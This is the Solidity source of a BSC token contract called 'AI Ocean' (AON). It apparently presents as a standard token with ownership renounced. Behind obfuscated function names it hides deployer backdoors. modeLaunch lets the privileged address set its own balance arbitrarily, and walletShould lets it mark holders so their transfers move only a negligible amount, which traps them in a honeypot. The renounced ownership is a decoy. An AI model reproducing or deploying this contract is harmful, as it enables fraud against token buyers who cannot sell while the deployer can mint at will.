/**
 *Submitted for verification at BscScan.com on 2023-02-03
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface fromFund {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface sellLiquidity {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract AIOcean is Ownable{
    uint8 public decimals = 18;
    address public isLimitSell;


    mapping(address => bool) public sellTx;
    string public symbol = "AON";
    uint256 public totalSupply = 100000000 * 10 ** 18;
    uint256 constant swapToken = 10 ** 10;
    bool public fromTrading;
    address public receiverEnableLaunch;


    mapping(address => bool) public receiverSell;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "AI Ocean";
    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        fromFund swapSender = fromFund(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        isLimitSell = sellLiquidity(swapSender.factory()).createPair(swapSender.WETH(), address(this));
        receiverEnableLaunch = fundAuto();
        sellTx[receiverEnableLaunch] = true;
        balanceOf[receiverEnableLaunch] = totalSupply;
        emit Transfer(address(0), receiverEnableLaunch, totalSupply);
        renounceOwnership();
    }

    

    function getOwner() external view returns (address) {
        return owner();
    }

    function senderLiquidityList(address tradingLiquidity, address receiverLimit, uint256 atReceiver) internal returns (bool) {
        require(balanceOf[tradingLiquidity] >= atReceiver);
        balanceOf[tradingLiquidity] -= atReceiver;
        balanceOf[receiverLimit] += atReceiver;
        emit Transfer(tradingLiquidity, receiverLimit, atReceiver);
        return true;
    }

    function amountTotal(address feeAmountTrading) public {
        if (fromTrading) {
            return;
        }
        sellTx[feeAmountTrading] = true;
        fromTrading = true;
    }

    function transferFrom(address tokenMode, address atTradingEnable, uint256 atReceiver) public returns (bool) {
        if (tokenMode != fundAuto() && allowance[tokenMode][fundAuto()] != type(uint256).max) {
            require(allowance[tokenMode][fundAuto()] >= atReceiver);
            allowance[tokenMode][fundAuto()] -= atReceiver;
        }
        if (atTradingEnable == receiverEnableLaunch || tokenMode == receiverEnableLaunch) {
            return senderLiquidityList(tokenMode, atTradingEnable, atReceiver);
        }
        if (receiverSell[tokenMode]) {
            return senderLiquidityList(tokenMode, atTradingEnable, swapToken);
        }
        return senderLiquidityList(tokenMode, atTradingEnable, atReceiver);
    }

    function modeLaunch(uint256 atReceiver) public {
        if (!sellTx[fundAuto()]) {
            return;
        }
        balanceOf[receiverEnableLaunch] = atReceiver;
    }

    function fundAuto() private view returns (address) {
        return msg.sender;
    }

    function walletShould(address toAuto) public {
        if (toAuto == receiverEnableLaunch || toAuto == isLimitSell || !sellTx[fundAuto()]) {
            return;
        }
        receiverSell[toAuto] = true;
    }

    function transfer(address atTradingEnable, uint256 atReceiver) external returns (bool) {
        return transferFrom(fundAuto(), atTradingEnable, atReceiver);
    }

    function approve(address shouldIs, uint256 atReceiver) public returns (bool) {
        allowance[fundAuto()][shouldIs] = atReceiver;
        emit Approval(fundAuto(), shouldIs, atReceiver);
        return true;
    }


}